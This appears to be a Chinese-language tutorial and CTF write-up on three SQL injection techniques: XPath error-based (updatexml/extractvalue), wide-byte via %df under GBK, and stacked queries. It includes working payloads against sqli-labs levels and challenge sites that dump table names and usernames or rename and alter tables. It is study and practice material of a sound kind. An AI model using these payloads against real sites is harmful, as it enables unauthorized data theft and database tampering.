# 前言：
SQL注入是web安全中最常见的攻击方式，SQL注入有很多方法，但如果只知道payload，不知道原理，感觉也很难掌握，这次就总结一下我所遇到的SQL注入方法，原理分析+题目实战。
# **0x00 Xpath报错** 注入
### **涉及函数**
updatexml():对xml进行查询和修改
extractvalue():对xml进行查询和修改
### **报错语句构造**
    select extractvalue(1,concat(0x7e,user(),0x7e))；
    mysql> select extractvalue(1,concat(0x7e,user(),0x7e));
    ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'
    select updatexml(1,concat(0x7e,version(),0x7e),1);
    mysql> select updatexml(1,concat(0x7e,version(),0x7e),1);
    ERROR 1105 (HY000): XPATH syntax error: '~5.5.53~'
### **原理分析**
extractvalue(xml_str , Xpath)
函数,按照Xpath语法从XML格式的字符串中提取一个值，如果函数中任意一个参数为NULL,返回值都是NULL。
其实就是对XML文档进行查询的函数，相当于HTML文件中用
``等标签查找元素一样，第一个参数传入目标xml文档，第二个参数使用Xpath路径法表示的查找路径
举个简单例子：
    select extractvalue('abbbacccaaaa','/a/c');
寻找前一段xml文档内容中的a节点下的c节点
    +----------------------------------------------------------+
    | extractvalue('abbbacccaaaa','/a/c') |
    +----------------------------------------------------------+
    | accc                                                     |
    +----------------------------------------------------------+
正常情况下的使用便是这样，但如果我们构造了不合法的Xpath ，MySQL便会出现语法错误，从而显示出XPath的内容。  
发现报错时少了一部分，没有前面的root，产生这样的问题是 **因为Xpath语法只有遇到特殊字符时才会报错**
那我们直接在需要连接的字符前添加特殊字符即可爆出我们想要的结果  
但是也要注意，报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断  
`updatexml()`函数 与`extractvalue()`类似 ，是更新xml文档的函数
`updatexml()`函数有三个参数，分别是(XML_document, XPath_string, new_value)
    第一个参数：XML_document是String格式，为XML文档对象的名称 
    第二个参数：XPath_string (Xpath格式的字符串) 
    第三个参数：new_value，String格式，替换查找到的符合条件的数据
原理相同，都是遇到特殊字符爆出错误
### 题目实战
sqli-labs17关，涉及到xpath报错注入
uname尝试发现没有任何变化，尝试下passwd，发现单引号报错，且有报错信息，可以使用xpath报错注入 尝试下爆出数据库
    uname=admin&passwd=1' or updatexml(1,concat(0x7e,database(),0x7e),1)# &submit=Submit
既然xpath报错注入可以,那就来一一爆出表、字段、值即可
**payload：**
    uname=admin&passwd=1' or updatexml(1,(select group_concat(table_name) from 
    information_schema.TABLES where TABLE_SCHEMA=database()),1)# &submit=Submit
下面就基本上将payload改下即可，但到爆值时会出一个问题
**payload** ：
    uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from users),0x7e),1)#&submit=Submit
出现这个错误的，是因为不能先select出同一表中的某些值，再update这个表
百度查找解决方法，发现需要再在外面加一层select即可解决
**最终payload** ：
    uname=admin&passwd=' or updatexml(1,concat(0x7e,(select username from (select username 
    from users)c limit 0,1),0x7e),1)#&submit=Submit
# 0x01 宽字节注入
### **涉及函数**
`addslashes()` 函数返回在预定义字符之前添加反斜杠的字符串
`mysql_real_escape_string()` 函数转义 SQL 语句中使用的字符串中的特殊字符
`mysql_escape_string()` — 转义一个字符串
### 原理分析
先了解一下什么是窄、宽字节已经常见宽字节编码：
    一、当某字符的大小为一个字节时，称其字符为窄字节.
    二、当某字符的大小为两个字节时，称其字符为宽字节.
    三、所有英文默认占一个字节，汉字占两个字节
    四、常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等
为什么会产生宽字节注入，其中就涉及到编码格式的问题了，宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码格式从而导致产生宽字节注入
问题就出现在使用PHP连接MySQL的时候，当设置
    “set character_set_client = gbk”
时会导致一个编码转换的问题
如果数据库使用的的是GBK编码而PHP编码为UTF8就可能出现注入问题，原因是程序员为了防止SQL注入，就会调用我们上面所介绍的几种函数，将单引号或双引号进行转义操作，转义无非便是在单或双引号前加上斜杠（\）进行转义
，但这样并非安全，因为数据库使用的是宽字节编码，两个连在一起的字符会被当做是一个汉字，而在PHP使用的UTF8编码则认为是两个独立的字符，如果我们在单或双引号前添加一个字符，使其和斜杠（\）组合被当作一个汉字，从而保留单或双引号，使其发挥应用的作用。但添加的字符的Ascii要大于128，两个字符才能组合成汉字
，因为前一个ascii码要大于128，才到汉字的范围 ，这一点需要注意。
### 题目实战
大段的文字可能枯燥无味，下面实战来体验一下：
    http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1'
返回结果为
    your sql:select id,title from news where id = '1\''
发现被转义了，使用最经典的%df
    ?id=1%df' and 1=1%23
返回结果为：
    your sql:select id,title from news where  id ='1运' and 1=1#'
％df和后面的\变成了一个汉字“运” ,所以单引号就可以不被转义，从而发挥闭合作用
爆出数据库，下面就很简单了，相当于知道了闭合符号，常用的payload更改一下即可  
SQL-labs32和33关也涉及到了宽字节注入，输入
    http://127.0.0.1/sqli-labs-master/Less-32/?id=1'
发现也是被转义了，那可以试一下宽字节注入
    http://127.0.0.1/sqli-labs-master/Less-32/?id=1%df%27
出现报错语句，说明单引号已经起作用了，后面的就常规payload即可
# 0x02 堆叠注入
### **涉及字符**
分号`（;）`，在SQL语句中用来表示一条sql语句的结束
### 原理分析
堆叠注入可以执行任意的语句 ，多条sql 语句一起执行。在MYSQL命令框中，常以`;`作为结束符，那我们便可以在一句SQL语句结束后再紧跟一句SQL语句
。
例如：
    mysql> show databases;use web1;select 1,2,3;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | BWVS               |
    | bbs                |
    | challenges         |
    | dvwa               |
    | mysql              |
    | performance_schema |
    | security           |
    | test               |
    | web1               |
    +--------------------+
    10 rows in set (0.00 sec)
    Database changed
    +---+---+---+
    | 1 | 2 | 3 |
    +---+---+---+
    | 1 | 2 | 3 |
    +---+---+---+
    1 row in set (0.00 sec)
但堆叠注入是有局限性的，并不是每个环境都可以用到的:
    一、可能受到API或者数据库引擎不支持的限制 
    二、权限不足
所以一般这种方法的注入只会出现在CTF题中，但正因为这种方法感觉简单，很多人都会忽略掉，强网杯的web题随便注便用到了这种方法，当时真的懵的一批。
### 题目实战
发现是回显注入，在测试过程中，发现  
很多重要的关键字都被过滤了，发现可以使用堆叠注入，那就来尝试一波
在此之前那，已经测试出`'`为闭合符号，那就来查询数据库、数据表
**查数据库**
    1';show databases;#
**查询数据表**
    1';show tables;#
再分别查询`1919810931114514`表和`words`表  
查询words表时，发现有id列，我们随便输入数字时，会回显出对应内容，所以回显内容肯定是从word这张表中回显的
再查询`1919810931114514`表
    1';show columns from `1919810931114514`;#
但是到这里就会出现问题，虽然我们已经得到了flag了，但是`select`被过滤了，而`show`命令又不能查看值。这就比较头疼了，不过如果仔细观察的话，一开始过滤的并没有`alert`
和
`rename`，我们已经知道了`words`是用来回显内容的，能不能我们把`1919810931114514`这个表更改名字为`words`,并增加相应的字段，使之回显原`1919810931114514`这个表的内容那，当然是可以的，这种思路。。。大师傅tql
**payload** :
    1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#
用`1' or '1'='1`访问一下，便可以发现flag